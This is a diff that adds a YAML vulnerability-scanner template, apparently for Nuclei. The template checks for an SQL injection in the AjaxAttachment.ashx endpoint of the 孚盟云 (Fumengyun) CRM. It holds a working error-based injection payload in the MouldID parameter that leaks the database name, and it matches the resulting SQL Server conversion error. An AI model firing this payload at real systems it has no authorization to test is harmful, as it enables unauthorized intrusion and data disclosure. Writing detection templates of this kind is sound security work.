@@ -1,0 +1,24 @@
+id: fumengyun-AjaxAttachment_ashx-sql
+
+info:
+  name: 孚盟云 AjaxAttachment.ashx SQL注入漏洞
+  author: fumengyun
+  severity: high
+  tags: sql injection
+
+http:
+  - raw:
+      - |
+        GET /m/Dingding/Ajax/AjaxAttachment.ashx?method=saveAttach&MouldID=1%27and+1%3Cdb_name%28%29-- HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '在将 nvarchar 值'
+          - '转换成数据类型 int 时失败'
+        condition: and
+      - type: status
+        status: 
+          - 500
